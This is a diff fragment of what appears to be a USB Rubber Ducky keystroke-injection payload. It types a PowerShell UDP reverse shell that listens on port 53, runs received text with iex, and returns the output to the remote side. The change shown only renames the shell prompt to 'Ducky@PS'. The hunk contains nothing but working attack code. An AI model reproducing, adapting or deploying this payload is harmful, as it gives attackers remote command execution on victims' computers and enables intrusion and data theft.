@@ -21,7 +21,7 @@ STRING ckets.UDPClient(53);[byte[]]$B=0..65535|%{0};$SB=([text.encoding]::ASCII)
 DELAY 100
 STRING B.Length,$E);while($true){;$R=$C.Receive([ref]$E);$RD=([text.encoding]::ASCII).GetString($R);$s=(iex $RD 2>&1 | Out-S
 DELAY 100
-STRING tring );$s2=$s+'PS ' + (pwd).Path + '> ';$SB =([text.encoding]::ASCII).GetBytes($s2);$C.Send($SB,$SB.Len
+STRING tring );$s2=$s+'Ducky@PS ' + (pwd).Path + '> ';$SB =([text.encoding]::ASCII).GetBytes($s2);$C.Send($SB,$SB.Len
 DELAY 100
 STRING gth,$E)};$C.Close()
 ENTER
